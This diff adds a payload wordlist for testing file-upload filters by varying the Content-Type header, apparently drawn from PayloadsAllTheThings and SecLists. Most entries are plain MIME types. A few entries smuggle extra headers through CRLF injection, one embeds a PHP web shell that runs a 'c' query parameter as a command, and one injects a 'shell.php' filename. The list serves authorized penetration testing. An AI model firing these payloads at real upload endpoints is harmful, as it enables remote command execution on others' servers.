@@ -1,0 +1,55 @@
+# File upload — MIME / Content-Type bypass (PAT + SecLists patterns)
+# Set Content-Type header in multipart part. Authorized testing only.
+
+Content-Type: image/gif
+Content-Type: image/png
+Content-Type: image/jpeg
+Content-Type: image/jpg
+Content-Type: image/pjpeg
+Content-Type: image/x-png
+Content-Type: image/svg+xml
+Content-Type: text/plain
+Content-Type: text/html
+Content-Type: application/octet-stream
+Content-Type: application/x-php
+Content-Type: text/x-php
+Content-Type: application/php
+Content-Type: application/x-httpd-php
+Content-Type: application/x-httpd-php-source
+Content-Type: multipart/form-data
+Content-Type: application/pdf
+Content-Type: application/xml
+Content-Type: text/xml
+Content-Type: application/json
+Content-Type: video/mp4
+Content-Type: audio/mpeg
+Content-Type: application/x-sh
+Content-Type: application/javascript
+Content-Type: text/javascript
+Content-Type: application/x-msdownload
+Content-Type: application/vnd.ms-excel
+Content-Type: application/vnd.openxmlformats-officedocument.spreadsheetml.sheet
+Content-Type: application/zip
+Content-Type: application/x-zip-compressed
+Content-Type: image/webp
+Content-Type: image/bmp
+Content-Type: image/tiff
+Content-Type: application/x-msdos-program
+Content-Type: application/x-msi
+Content-Type: application/x-perl
+Content-Type: application/x-python
+Content-Type: application/java-archive
+Content-Type: application/x-java-applet
+Content-Type: application/x-shellscript
+Content-Type: binary/octet-stream
+Content-Type: null
+Content-Type: 
+Content-Type: image/gif; charset=utf-8
+Content-Type: image/png; boundary=something
+Content-Type: image/jpeg\r\nX-Injected: true
+Content-Type: image/png\r\n\r\n<?php system($_GET['c']); ?>
+Content-Type: image/gif\r\nContent-Disposition: form-data; name="file"; filename="shell.php"
+
+# Double Content-Type (send two headers — second may win on misconfigured parsers)
+Content-Type: image/jpeg
+Content-Type: application/x-httpd-php
